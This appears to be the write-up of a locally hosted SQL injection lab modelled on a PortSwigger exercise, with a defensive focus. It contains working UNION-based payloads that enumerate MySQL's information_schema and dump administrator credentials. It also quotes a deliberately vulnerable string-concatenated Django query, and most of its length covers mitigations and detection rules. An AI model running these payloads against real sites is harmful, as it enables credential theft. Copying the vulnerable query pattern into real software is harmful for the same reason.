# Lab 05 — SQL injection attack, listing the database contents on non-Oracle databases

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle> |
| Lab id | `psw-sqli-05-list-db-contents-non-oracle` |
| Vulnerability class | SQL Injection — UNION-based schema enumeration and data exfiltration |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | MySQL 8.4 (two-container compose: `web` + `db`) |
| Host URL | <http://127.0.0.1:18005/> |
| Flag | `FLAG{psw-sqli-05-list-db-contents-admin-access}` (revealed on `/my-account` after admin login) |

### Objective

The storefront exposes a category filter backed by a raw SQL string. The attacker is expected to:

1. Pivot through the `category` parameter into a UNION-based injection.
2. Enumerate the MySQL schema via `information_schema.tables` and `information_schema.columns` to discover a table that stores application users.
3. Exfiltrate the administrator's credentials (the password is a random 16-byte token created at seed time, so it cannot be guessed).
4. Log in through the legitimate `/login` form and browse to `/my-account`, which only renders the flag when the session is bound to a user with `is_admin = True`.

The login view itself is parameterised on purpose, so the only path to the admin session is through the UNION extraction.

---

## 2. Exploit walkthrough

The vulnerable query is built with plain string concatenation:

```sql
SELECT id, name, category, description, price, released
FROM products
WHERE category = '<USER INPUT>' AND released = 1
```

Six columns are emitted, of mixed types (int, string, string, string, decimal, bool). A MySQL `UNION` requires a matching column count; string-typed placeholders are safe in every slot because MySQL coerces literals.

**Step 1 — confirm injection and column count**

```
GET /filter?category=Gifts' UNION SELECT 1,2,3,4,5,6-- -
```

The response now shows the benign "Gifts" rows plus one synthetic row `(1, 2, 3, 4, 5, 6)`. Column count confirmed as six; the `executed_sql` field on the rendered page (see [`filter.html:19`](shop/templates/shop/filter.html#L19)) echoes the full concatenated statement, which makes tuning the payload trivial.

**Step 2 — enumerate tables via `information_schema.tables`**

```
GET /filter?category=x' UNION SELECT table_schema,table_name,3,4,5,6 FROM information_schema.tables-- -
```

The results list every accessible table. Filtering by `table_schema='shop'` narrows to the application's own tables — `products`, `users`, `flags`, plus Django's `django_session`.

**Step 3 — enumerate the `users` columns via `information_schema.columns`**

```
GET /filter?category=x' UNION SELECT column_name,data_type,3,4,5,6 FROM information_schema.columns WHERE table_schema='shop' AND table_name='users'-- -
```

The response reveals `id`, `username`, `password`, `email`, `is_admin`. See [`shop/models.py:18-36`](shop/models.py#L18-L36) for the model definition.

**Step 4 — exfiltrate the administrator credentials**

```
GET /filter?category=x' UNION SELECT id,username,password,email,is_admin,6 FROM users-- -
```

Or, more surgically:

```
GET /filter?category=x' UNION SELECT 1,username,password,4,5,6 FROM users WHERE is_admin=1-- -
```

The `administrator` row comes back with its randomly generated password (see [`shop/management/commands/seed.py:57-63`](shop/management/commands/seed.py#L57-L63)).

**Step 5 — log in and collect the flag**

`POST /login` with the recovered `administrator` / `<token>` credentials, then `GET /my-account`. [`shop/views.py:138-153`](shop/views.py#L138-L153) gates the flag on `user.is_admin`; once satisfied it renders `FLAG{psw-sqli-05-list-db-contents-admin-access}`.

---

## 3. Vulnerable code

### Endpoint: `GET /filter`

[shop/views.py:75-82](shop/views.py#L75-L82)

```python
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT id, name, category, description, price, released "
        "FROM products "
        "WHERE category = '" + category + "' AND released = 1"
    )
```

The raw string is assembled from untrusted input with one literal single quote on either side. A `'` in `category` closes the literal early; `-- -` comments out the `AND released = 1` suffix; `UNION SELECT ...` appended in between grafts a second query onto the executed statement.

[shop/views.py:87-94](shop/views.py#L87-L94)

```python
    try:
        with connection.cursor() as cursor:
            cursor.execute(query)
            columns = [col[0].lower() for col in cursor.description]
            for row in cursor.fetchall():
                rows.append(dict(zip(columns, row)))
    except Exception as exc:
        error = f"Database error: {exc}"
```

`cursor.execute(query)` is called with a single positional argument, so no parameter binding occurs. The entire pre-built string is sent verbatim to the MySQL driver. The generic `except Exception` block also reflects raw driver error text back to the client, which aids the attacker while tuning their UNION column types.

### Reflection of executed SQL

[shop/views.py:98-109](shop/views.py#L98-L109) and [shop/templates/shop/filter.html:19](shop/templates/shop/filter.html#L19) — the composed query string is rendered into the response, turning the endpoint into an oracle for iteratively refining payloads without needing blind techniques.

### Safe login view (for contrast)

[shop/views.py:112-130](shop/views.py#L112-L130) — `User.objects.filter(username=username, password=password)` goes through the Django ORM, which binds both parameters. This is deliberate: the lab forces the attacker to recover real credentials, not to bypass the login form with `' OR 1=1-- -`.

### Seed data

[shop/management/commands/seed.py:57-63](shop/management/commands/seed.py#L57-L63) — the admin password is a fresh `secrets.token_urlsafe(16)` per seeding, so the lab cannot be solved with a static password dictionary; the attacker must actually exfiltrate the row.

### Database configuration

[docker-compose.yml:4-30](docker-compose.yml#L4-L30) and [sqli_lab/settings.py:51-63](sqli_lab/settings.py#L51-L63) — `labuser` connects to MySQL 8.4, which exposes `information_schema` to every authenticated account by default.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of `request.GET["category"]` into SQL** | Attacker controls query syntax. Quotes, comments, and `UNION` are interpreted as code. |
| **`cursor.execute(query)` with no bound parameters** | The MySQL driver has no way to distinguish data from statement text. |
| **`SELECT` shape known and reflected** (`executed_sql` variable) | Column count and order are handed to the attacker; iterative payload tuning becomes trivial. |
| **Driver error text echoed to the user** | Type-mismatch errors guide the attacker to the correct UNION column types. |
| **`labuser` reads `information_schema` freely** | MySQL grants `information_schema` metadata to every authenticated account; table and column names of the whole `shop` database leak in one query. |
| **Plaintext passwords in the `users` table** | Once a row is dumped via UNION, credentials are immediately usable. No hashing step to buy time. |
| **Storefront user and login user share the same DB role** | The low-privilege catalogue query is executed under an account that can also read the credentials table. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the filter query

The minimal change that closes the injection is to stop concatenating and bind instead:

```python
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT id, name, category, description, price, released "
        "FROM products "
        "WHERE category = %s AND released = 1"
    )
    with connection.cursor() as cursor:
        cursor.execute(query, [category])
        rows = cursor.fetchall()
```

With the parameter bound, `x' UNION SELECT ...` is matched literally against the `category` column — no UNION, no pivot to `information_schema`.

### 5.2 Prefer the ORM

Hand-rolled SQL is unjustified here. The view already has a `Product` model:

```python
from .models import Product

def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")
    products = (
        Product.objects
        .filter(category=category, released=True)
        .values("id", "name", "category", "description", "price", "released")
    )
```

Django's query compiler always binds parameters, and the `released=True` gate lives in Python rather than in a string that an attacker can truncate.

### 5.3 Allow-list the category

`category` is drawn from a small, enumerable set. Reject unknown values up front:

```python
ALLOWED_CATEGORIES = {"Accessories", "Tech", "Lifestyle", "Gifts", "Pets", "Clothing"}

def filter_products(request):
    category = request.GET.get("category", "")
    if category not in ALLOWED_CATEGORIES:
        return HttpResponseBadRequest("unknown category")
    ...
```

This is defence-in-depth: parameterisation stops injection; validation stops ill-formed input from reaching the query layer at all and removes the injection oracle entirely (no category, no response shape to tune against).

### 5.4 Remove the SQL reflection and the verbose error

Delete `executed_sql` from the context and from `filter.html`. Catch specific exceptions and render a generic message:

```python
except DatabaseError:
    error = "Query failed."
```

An attacker who cannot see column names or error text is forced to fall back to blind techniques, which are dramatically slower and more detectable.

### 5.5 Hash passwords and split the credential store

Store credentials with `argon2` or `bcrypt` via `django.contrib.auth` rather than in a plain `CharField` (see [`shop/models.py:27-28`](shop/models.py#L27-L28)). Even if UNION-based SQLi exfiltrates the `users` table, the attacker has to crack each hash. Combined with high-entropy admin passwords this turns a one-step compromise into an offline workload.

### 5.6 Enforce authorisation outside the query string

The admin flag gate in [`shop/views.py:138-153`](shop/views.py#L138-L153) is fine, but the model-level `is_admin` boolean is also exfiltratable. Using Django's built-in groups/permissions, row-level security in the database, or a separate `admin_profile` table accessible only through a stored procedure with a different DB role removes the "read admin flag via the same SELECT" pattern.

---

## 6. Network / infrastructure-level mitigation

### 6.1 Web Application Firewall (WAF)

Deploy a WAF in front of the web tier with the OWASP Core Rule Set (CRS). Relevant rules for this class of attack:

- `REQUEST-942` (SQL injection) — catches `UNION SELECT`, `information_schema`, `ORDER BY n`, comment sequences `-- `, `#`, `/* */`.
- `REQUEST-941` (XSS) and `REQUEST-920` (protocol enforcement) — block oversized query strings and non-UTF-8 payloads used to smuggle past naive decoders.
- Custom rule: alert on any query string containing the substrings `information_schema`, `sys.tables`, `pg_catalog`, or `sqlite_master` — these have no legitimate reason to appear in a storefront parameter.

A WAF is not a substitute for fixing the code — CRS rules are signature-based and can be evaded with encoding tricks — but it raises the noise floor and slows automated tooling.

### 6.2 Least-privilege database account

The `labuser` account in [`docker-compose.yml:11-12`](docker-compose.yml#L11-L12) is a full owner of the `shop` database. Production builds should:

- Grant only `SELECT, INSERT, UPDATE` on the specific tables the application uses; no `DDL`, no `FILE`, no `PROCESS`.
- Split roles: one role for the catalogue query (`SELECT` on `products` only), another for authentication (`SELECT` on `users` only, ideally through a stored procedure), another for admin surfaces. The vulnerable `/filter` endpoint should run under the catalogue role, which has no privileges on `users` or `flags` — the UNION injection then returns nothing useful even if it executes.

Note on `information_schema`: in both MySQL and PostgreSQL, revoking a user's view of `information_schema` is not generally practical because the catalogue is required for the driver, the ORM, and internal query planning; filtered views (MySQL 8 shows each account only objects it has privileges on) partially mitigate this **only if the per-table privileges are tightened first**. The effective control is therefore least-privilege on the application tables themselves, which causes `information_schema.tables` and `information_schema.columns` to hide rows the role cannot see.

### 6.3 Network segmentation and egress control

- The MySQL container is attached to `psw-sqli-05-list-db-contents-non-oracle-net` ([`docker-compose.yml:29-30`](docker-compose.yml#L29-L30)) and has no published ports — it is only reachable from the `web` container. Keep it that way in production: databases must never be reachable from the public internet.
- The `web` container publishes `127.0.0.1:18005:8000` ([`docker-compose.yml:38`](docker-compose.yml#L38)), bound to loopback for the lab. Behind a real deployment, terminate TLS at an ingress proxy and keep the app on a private network.
- Block egress from the DB container. If a future injection reaches `LOAD_FILE`, `SELECT ... INTO OUTFILE`, or a UDF, egress control stops the exfiltration channel.

### 6.4 Monitoring, alerting, and rate limiting

- Enable the MySQL general log (or Performance Schema statement digests) and alert on any query containing `information_schema.tables`, `information_schema.columns`, or `UNION` from the application role. Neither the ORM nor the parameterised catalogue query generates these under normal operation.
- Spike in parse errors on `/filter` = active injection probing. Alert early.
- Rate-limit `/filter` per client IP; UNION tuning typically requires dozens of variants in quick succession.

### 6.5 Secret rotation and credential hygiene

- Rotate the application DB password out of the compose file and into a secrets manager.
- The admin password in [`seed.py:57`](shop/management/commands/seed.py#L57) uses `secrets.token_urlsafe(16)` — suitable for a lab. Real admin accounts should use short-lived credentials or passkeys so that a one-time UNION dump does not yield a permanently valid secret.

---

## 7. Defense-in-depth checklist

- [ ] All SQL goes through parameterised statements or the ORM; no `+` / `%` / f-string SQL builders.
- [ ] Raw `cursor.execute(query)` (single argument) is banned by lint / SAST (`bandit B608`, `semgrep python.django.security.injection.sql`).
- [ ] Known-enumerable inputs (category, sort order, page size) validated against allow-lists.
- [ ] No query text, no driver error text, and no column metadata reflected to the client.
- [ ] Passwords stored via `django.contrib.auth` hashers (`argon2`, `bcrypt`), never plaintext.
- [ ] Separate database roles per surface; catalogue role cannot read `users` or `flags`.
- [ ] Admin-only tables guarded at the DB layer (role, view, or RLS) so `information_schema` enumeration reveals only what the role can already see.
- [ ] WAF with CRS in front of the app, with a custom rule alerting on `information_schema`, `UNION SELECT`, and `sleep(` / `benchmark(`.
- [ ] DB container has no published ports; egress blocked.
- [ ] Structured logging of SQL errors, with alerting on parse-error spikes and on queries touching system catalogues from application roles.
- [ ] High-entropy admin credentials rotated regularly; ideally replaced with SSO / WebAuthn.

---

## 8. References

- PortSwigger Web Security Academy — [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
- PortSwigger — [Examining the database in SQL injection attacks](https://portswigger.net/web-security/sql-injection/examining-the-database)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- OWASP — [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- MySQL Reference Manual — [The INFORMATION_SCHEMA Database](https://dev.mysql.com/doc/refman/8.4/en/information-schema.html)
- Django docs — [Performing raw SQL queries](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly)
- OWASP CRS — <https://coreruleset.org/>
